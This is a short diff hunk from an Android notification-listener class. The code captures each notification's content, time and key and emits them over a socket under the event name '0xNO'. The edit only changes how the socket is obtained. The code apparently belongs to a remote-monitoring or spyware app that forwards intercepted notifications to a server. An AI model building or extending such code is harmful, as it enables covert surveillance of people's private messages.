@@ -36,7 +36,7 @@ public class NotificationListener extends NotificationListenerService {
             data.put("content", "" + content);
             data.put("postTime", postTime);
             data.put("key", uniqueKey);
-            IOSocket.getInstance().getIoSocket().emit("0xNO" , data);
+            IOSocket.getSocket().emit("0xNO" , data);
         } catch (JSONException e) {
             e.printStackTrace();
         }
